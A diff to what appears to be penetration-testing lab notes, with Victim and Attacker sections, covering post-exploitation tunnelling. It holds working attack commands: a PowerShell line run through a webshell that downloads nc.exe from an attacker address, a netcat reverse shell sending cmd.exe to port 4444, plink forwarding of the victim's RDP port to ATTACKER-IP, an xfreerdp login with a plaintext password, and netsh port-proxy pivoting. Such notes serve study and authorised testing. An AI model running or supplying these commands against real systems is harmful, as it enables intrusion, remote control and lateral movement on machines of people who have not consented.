@@ -70,9 +70,6 @@ Victim
 # Run via webshell .../umbraco/forms.aspx
 powershell wget -Uri http://192.168.45.241/nc.exe -OutFile C:\Windows\Temp\nc.exe
 C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.241 4444
-```
-
-Attacker
 
 ```bash
 # Run via rshell to forward xRDP
@@ -85,6 +82,13 @@ C:\Windows\Temp\plink.exe -ssh -l USER -pw %pw% -R 127.0.0.1:9999:127.0.0.1:3389
 # Pipe keystrokes with echo to PLink that forwards Remote Desktop Port to Attacker local port 9999
 cmd.exe /c echo n | C:\Windows\Temp\plink.exe -ssh -l USER -pw %pw% -R 127.0.0.1:9999:127.0.0.1:3389 ATTACKER-IP
 
+# Attack using the loopback port on kali linux
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9999
+```
+
+Attacker
+
+```bash
 # Attack using the loopback port on kali linux
 xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9999
 ```
@@ -103,6 +107,9 @@ Victim
 
 ```bash
 xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.175.64
+
+# Set IPv4 port forwarding on interface "Ethernet1"
+netsh interface ipv4 set interface "Ethernet1" forwarding=enabled
 
 # Use net shell establish SSH tunnel to remote Victim
 netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.175.64 connectport=22 connectaddress=10.4.175.215
